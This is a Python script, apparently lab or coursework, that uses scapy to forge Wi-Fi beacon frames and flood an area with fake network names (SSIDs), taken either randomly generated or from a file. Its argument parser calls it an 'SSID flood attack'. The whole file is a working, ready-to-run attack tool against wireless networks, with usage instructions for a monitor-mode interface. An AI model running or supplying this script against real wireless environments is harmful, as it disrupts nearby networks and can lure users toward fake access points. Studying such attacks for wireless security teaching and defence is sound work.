#!/bin/python3
import argparse

import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11Elt, RadioTap, Dot11, Dot11Beacon


def forge_packet(ssid):
    """
    Forge a Beacon frame based on the user selected BSSID
    :param bssid: the BSSID of the packet to forge
    :return: the forged packet
    """

    # default bssid of the interface
    bssid = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK][0]['addr']

    # channel is fixed to 11
    channel = 11

    # forge beacon packet
    packet = RadioTap() \
             / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) \
             / Dot11Beacon(cap="ESS+privacy") \
             / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) \
             / Dot11Elt(ID="DSset", info=chr(channel))

    return packet


def send_beacon(interface, ssid, count):
    """
    Send a beacon frame with a given ssid
    :param interface: The interface to send the packet from
    :param ssid: The SSID to put into the packet
    :param count: the number of time to send the beacon
    """
    frame = forge_packet(ssid)
    print("Sending {:d} beacons for ssid {}".format(int(count), ssid))
    sendp(frame, iface=interface, inter=1, count=count)


def ssid_flood():
    # If no SSID name file given generate random names
    if args.ssid_number:
        for _ in range(int(args.ssid_number)):
            # max length of SSID set to 8
            send_beacon(args.Interface, str(uuid.uuid4())[:8], int(args.count))
    else:
        with open(args.ssid_file) as f:
            for line in f:
                # SSID can be max 32 char
                if len(line) > 32:
                    continue
                send_beacon(args.Interface, line, int(args.count))


# Args parsing
parser = argparse.ArgumentParser(prog="Scapy SSID flood attack",
                                 usage="ssid_flood.py -i wlp2s0mon [-n 5 | -f path/to/file] [-c 10]",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to use, needs to be set to monitor mode")
parser.add_argument("-n", "--ssid-number", required=False, help="The amount of fake SSIDs to generate")
parser.add_argument("-f", "--ssid-file", required=False, help="A file with ssid names to flood with")
parser.add_argument("-c", "--count", required=False, help="Number of beacons to send per ssid", default="10")

args = parser.parse_args()

# start the attack
ssid_flood()
